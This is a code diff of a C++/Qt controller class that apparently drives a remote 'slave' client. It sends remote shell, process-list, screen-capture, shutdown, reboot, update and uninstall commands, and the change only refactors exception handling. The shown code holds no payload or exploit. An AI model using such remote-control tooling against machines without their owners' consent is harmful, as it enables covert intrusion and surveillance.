@@ -1,16 +1,17 @@
-#include <exception>
-#include <string>
-using namespace std;
-
 #include <QThread>
 #include <QWaitCondition>
 #include <QTextStream>
 #include <QMessageBox>
+
 #include "Slave.hpp"
+
 #include <common/Log.hpp>
 #include <system/File.hpp>
 #include <Innocence.hpp>
 using namespace Blaspheme;
+
+#include <string>
+using namespace std;
 
 namespace Master
 {
@@ -52,9 +53,8 @@ namespace Master
             session >> buffer;
             return QString(buffer.c_str());
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
             emit disconnected();
         }
         catch(...)
@@ -143,14 +143,8 @@ namespace Master
             }
             processes.sort();
         }
-		catch(Network::SocketException& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
-            emit disconnected();
-        }
-        catch(exception& e)
-        {
-            LOG << e.what();
             emit disconnected();
         }
         catch(...)
@@ -178,9 +172,8 @@ namespace Master
                 updateProcessList();
             }
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
             emit disconnected();
         }
         catch(...)
@@ -210,14 +203,8 @@ namespace Master
                 emit remoteShellState(false);
             }
         }
-		catch(Network::SocketException& e)
+		catch(Common::Exception&)
         {
-            LOG << e.what();
-            emit disconnected();
-        }
-        catch(exception& e)
-        {
-            LOG << e.what();
             emit disconnected();
         }
         catch(...)
@@ -249,14 +236,8 @@ namespace Master
 			}
 			LOG << "Image format : " + toString(screen.width()) + "x" + toString(screen.height());
 		}
-		catch(Network::Deconnection& e)
+		catch(Common::Exception&)
         {
-            LOG << e.what();
-            emit disconnected();
-        }
-        catch(TransferException& e)
-        {
-            LOG << e.what();
             emit disconnected();
         }
         catch(...)
@@ -272,14 +253,10 @@ namespace Master
         {
             session << SHUTDOWN;
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         emit disconnected();
     }
 
@@ -289,14 +266,11 @@ namespace Master
         {
             session << REBOOT;
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
+		emit disconnected();
     }
 
     void Slave::remoteLogout()
@@ -305,14 +279,10 @@ namespace Master
         {
             session << LOGOUT;
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         emit disconnected();
     }
 
@@ -322,14 +292,10 @@ namespace Master
         {
             session << HIBERNATE;
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         emit disconnected();
     }
 
@@ -339,14 +305,10 @@ namespace Master
         {
             session << REBOOT_CLIENT;
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         emit disconnected();
     }
 
@@ -356,14 +318,10 @@ namespace Master
         {
             session << KILL_CLIENT;
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         emit disconnected();
     }
 
@@ -389,9 +347,8 @@ namespace Master
                 QMessageBox::critical(0, tr("Problem"), tr("Unable to update slave"));
             }
         }
-        catch(exception& e)
+        catch(Common::Exception&)
         {
-            LOG << e.what();
             emit disconnected();
         }
         catch(...)
@@ -407,10 +364,7 @@ namespace Master
         {
             session << UNINSTALL_CLIENT;
         }
-        catch(...)
-        {
-            LOG << "Unknown exception";
-        }
+        CATCH_UNKNOWN_EXCEPTION
         emit disconnected();
     }
 
